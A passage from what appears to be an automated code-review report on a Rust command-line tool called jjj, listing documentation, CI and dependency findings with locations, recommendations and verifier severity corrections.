- **Recommendation:** Change the README example to `jjj problem duplicate "Search" --of "Other"` and add a `duplicate` entry to docs/reference/cli-problem.md (ideally as a `bash,test` block so the doc-test harness catches future drift).
- **Verifier correction:** Location, code claim, and proposed fix are all accurate. Only the severity is overstated (high -> medium): this is a non-harness README example, so it does not cause CI failures or affect runtime behavior — just a single broken copy-paste snippet. The recommendation to also add a `duplicate` entry to docs/reference/cli-problem.md (as a `bash,test` block so the doc-test harness catches future drift) is sound and addresses the deeper gap that no correct reference currently exists.

### 🟡 `MEDIUM` README `solution comment` example mis-orders args — `ID` is parsed as the reply body

**Category** docs · **Effort** trivial · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `nit`**

- **Location:** `README.md:97`
- **Problem:** The README shows `jjj solution comment "search index" --critique ID "reply"`. In the actual CLI (src/cli.rs:710-721) the signature is `comment [solution_id] --critique <c> [body]`. With `--critique ID` consuming `ID` as the critique reference, the trailing `"reply"` becomes the `body` positional — so the literal token `ID` is treated as the critique selector and `reply` as the body. The example reads as if `ID` is a placeholder for the critique and `"reply"` is the comment, but a reader can't tell `ID` is meant to be replaced, and the placement implies `"reply"` is a separate arg to `--critique`.
- **Recommendation:** Rewrite to make placeholders explicit, e.g. `jjj solution comment "search index" --critique <critique-id> "your reply text"`.
- **Verifier correction:** Severity should be "nit" not "medium": the documented command parses correctly; the only issue is that the bare token `ID` isn't visually marked as a placeholder (inconsistent with the quoted-value convention used elsewhere in the README). The title/claim mis-frame a cosmetic placeholder issue as an argument-ordering/parsing bug ("`ID` is parsed as the reply body" is factually wrong — `ID` is the critique selector, `reply` is the body, exactly as intended). The proposed fix is good; recommend rewording it as a placeholder-clarity cleanup, e.g. `jjj solution comment "search index" --critique <critique-id> "your reply text"`.

### 🟡 `MEDIUM` Runtime hint points to removed `jjj rank session` subcommand

**Category** docs · **Effort** trivial · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/rank.rs:125`
- **Problem:** When no rankings exist, the command prints: `No rankings yet for milestone '{}'. Start with `jjj rank session`.` But `jjj rank session` does not exist — the only RankAction is `Show` (src/cli.rs:1029-1044), and the design doc docs/plans/2026-03-22-manual-ordering-qv-design.md:181 explicitly says "Remove: jjj rank session". The user-facing docs guide (docs/guides/ranking.md) correctly uses `jjj rank show`, so the codebase contradicts itself. A user following this hint runs a non-existent command.
- **Recommendation:** Update the message to reference how rankings are actually created (TUI tier/vote actions per CLAUDE.md, or `jjj ui`), not the removed `rank session` command.

### 🟡 `MEDIUM` VS Code extension references five entity fields that were removed from the data model

**Category** docs · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `vscode/src/cli.ts:18,37,62,82,83 and vscode/src/documents/entityDocumentProvider.ts:62,111,157,182,184`
- **Problem:** Per CLAUDE.md, the fields context (Problem), tradeoffs (Solution), evidence (Critique), goals & success_criteria (Milestone) were removed — all free-form content now lives in the single body field. Confirmed: src/models/{problem,solution,critique,milestone}.rs no longer define these fields, so the CLI JSON no longer emits them. But the extension's TypeScript interfaces still declare them as REQUIRED `string` fields (cli.ts:18 `context: string`, :37 `tradeoffs: string`, :62 `evidence: string`, :82 `goals: string`, :83 `success_criteria: string`), and entityDocumentProvider.ts still renders `## Context`, `## Tradeoffs`, `## Evidence`, `## Goals`, `## Success Criteria` sections from them. At runtime these are always undefined, so the sections silently vanish — but the types are now incorrect (non-optional fields that are never present) and the render code is dead. The extension is out of sync with the CLI surface.
- **Recommendation:** Update vscode/src/cli.ts interfaces to drop the removed fields and render the actual body fields instead (description/approach/argument/description). For Milestone, render `m.description` rather than the non-existent `m.goals`/`m.success_criteria`. Bump the extension version and regenerate the .vsix.

### 🟡 `MEDIUM` Cargo `[build-dependencies]` declared but no build.rs exists — dead, builds extra deps

**Category** build · **Effort** trivial · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `Cargo.toml:54-56`
- **Problem:** Cargo.toml declares a `[build-dependencies]` section pulling in clap (with derive+cargo features) and clap_complete, but there is NO build.rs anywhere in the repo (verified: `find . -name build.rs -not -path ./target/*` returns nothing). Shell completions are generated at runtime via the `Completion` command in src/commands/completion.rs (which uses clap_complete as a normal dependency), not at build time. The build-dependencies section is therefore entirely unused — it forces Cargo to compile clap + clap_complete a second time as a build-time host dependency for no reason, slowing clean builds.
- **Recommendation:** Delete the entire `[build-dependencies]` section from Cargo.toml. If pre-built completions are desired, add an actual build.rs that uses them; otherwise the section is pure dead weight.
- **Verifier correction:** Core claim (dead [build-dependencies] with no build.rs) is correct and the fix is a clean, safe improvement. Recommend downgrading severity to low/nit: because clap and clap_complete are already in [dependencies], the "forces Cargo to compile them a second time, slowing clean builds" rationale only holds materially under cross-compilation; for typical native builds the unit graph shares those compilations. Location Cargo.toml:54-56 is accurate.

### 🟡 `MEDIUM` CI runs Linux-only — no macOS job despite stated macOS+Linux support

**Category** build · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `.github/workflows/ci.yml:13`
- **Problem:** The CI `check` job runs only on `ubuntu-latest`. There is no build matrix and no macOS (or Windows) runner. The project explicitly targets macOS (primary) and Linux (secondary), and the code does platform-specific things (subprocess invocation of jj/gh, file paths, terminal/TUI via crossterm). Platform-specific regressions (path handling, process spawning, signal handling in the TUI) would not be caught. This is a real coverage gap for a tool whose primary platform is macOS.
- **Recommendation:** Add a `strategy.matrix.os: [ubuntu-latest, macos-latest]` to the check job and set `runs-on: ${{ matrix.os }}`. Optionally add windows-latest if supported.

### 🔵 `LOW` CI clippy never lints test code (~25 warnings hidden)

**Category** build · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `.github/workflows/ci.yml (Clippy step)`
- **Problem:** CI runs `cargo clippy -- -D warnings`, which lints only the default target set (lib + bins) and passes clean. But `cargo clippy --all-targets` surfaces ~25 warnings, all in test code (e.g. `needless_borrow` x12, `field_reassign_with_default` x5, `manual_strip` x4, `unnecessary_map_or` x2, `items_after_test_module` x1 across tests/workflow_test.rs, tests/integration_storage.rs, tests/github_sync_e2e_test.rs, the lib test module, etc.). Because CI omits `--all-targets`, these never fail the build and accumulate. Style-only, but they erode the value of the `-D warnings` gate and let test code rot.
- **Recommendation:** Change the CI step to `cargo clippy --all-targets --all-features -- -D warnings` and fix (or `cargo clippy --fix`) the existing test-code warnings so the gate is meaningful across the whole codebase.

### 🔵 `LOW` No MSRV enforcement despite declared rust-version = 1.82

**Category** build · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `Cargo.toml:5, rust-toolchain.toml`
- **Problem:** Cargo.toml declares `rust-version = "1.82"` (MSRV), but nothing enforces it. rust-toolchain.toml pins `channel = "stable"` (always latest stable, not 1.82), and CI uses `dtolnay/rust-toolchain@stable`. So code that accidentally relies on a post-1.82 stdlib/language feature would compile fine locally and in CI while silently breaking the advertised MSRV. The MSRV claim is unverified.
- **Recommendation:** Either add a CI matrix entry using `dtolnay/rust-toolchain@1.82.0` that runs `cargo check`/`cargo test`, or drop the `rust-version` field if MSRV is not actually a commitment.

### 🔵 `LOW` install.sh has dead build-failure check under `set -e`

**Category** build · **Effort** trivial · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `install.sh:48-52`
- **Problem:** The script sets `set -euo pipefail` at the top, then runs `cargo build --release` followed by `if [ $? -ne 0 ]; then echo 'Build failed'; exit 1; fi`. Under `set -e`, a non-zero `cargo build` already aborts the script immediately, so the `$? -ne 0` block is unreachable dead code and the custom 'Build failed' message never prints. Cosmetic, but misleading to maintainers.
- **Recommendation:** Either drop the redundant `if [ $? -ne 0 ]` block, or wrap the build as `if ! cargo build --release; then ...; fi` to make the custom message reachable.

### 🔵 `LOW` README claims crates.io install (`cargo install jjj`) but repo/homepage suggest it may be unpublished under that name

**Category** docs · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `README.md:159-160, Cargo.toml:9`
- **Problem:** The README lists `cargo install jjj` 'From crates.io' as the first install option. Yet README.md:208-210 notes the `jjj` crate name was previously used by a different project (now renamed to megamerge), and Cargo.toml:9 sets repository to `https://github.com/doug/jjj` (a likely-placeholder path that doesn't match the real homepage jjj.recursivewhy.com). If this crate is not actually published as `jjj` on crates.io, the documented install command silently installs the wrong/old crate or fails. Could not verify publication status offline, but the signals (renamed predecessor + placeholder repo URL) make this a real risk worth confirming.
- **Recommendation:** Verify the crate is published on crates.io under `jjj` at the current version; if not, remove/adjust the `cargo install jjj` line and lead with `cargo install --path .` / the install.sh path. Also correct the placeholder `repository` URL in Cargo.toml to the canonical repo.

### ⚪ `NIT` Storage-layout docs omit the rankings/ directory

**Category** docs · **Effort** trivial · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `docs/architecture/storage.md:87-102, README.md:122-133`
- **Problem:** Both the README shadow-graph diagram and docs/architecture/storage.md list config.toml, problems/, solutions/, critiques/, milestones/, events.jsonl — but neither mentions the `rankings/{milestone_id}/{user_slug}.json` files that the ranking feature writes (src/ranking/ordering.rs:9,86). CLAUDE.md does document rankings, so the user-facing docs are the ones lagging. Minor since rankings are derived/per-user, but the layout docs are presented as authoritative.
- **Recommendation:** Add `rankings/{milestone_id}/{user}.json` to the storage layout diagrams in storage.md (and optionally README) with a one-line note that they hold per-user priority/vote orderings.

### ⚪ `NIT` Dependency notes: serde_yml fork and outdated major versions of thiserror/rusqlite

**Category** build · **Effort** medium · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `Cargo.toml:23,29,40`
- **Problem:** Three dependency-hygiene observations (none breaking): (1) `serde_yml = "0.0.12"` is a 0.0.x fork of the unmaintained serde_yaml with a checkered maintenance/supply-chain history — worth a conscious pin/review. (2) `thiserror = "1.0"` — a stable 2.x exists; staying on 1.x is fine but is a deliberate-vs-stale question. (3) `rusqlite = "0.31"` with `bundled` is several minor versions behind current; bundling SQLite is intentional for portability but the version is dated. `cargo tree -d` shows only benign duplicate transitives (3x hashbrown, 2x rustix, 2x unicode-width) that come from upstream crates and aren't directly controllable.
- **Recommendation:** Audit serde_yml's maintenance status and consider a maintained alternative; evaluate bumping thiserror to 2.x and rusqlite to a current 0.3x release as routine maintenance. No urgent action.
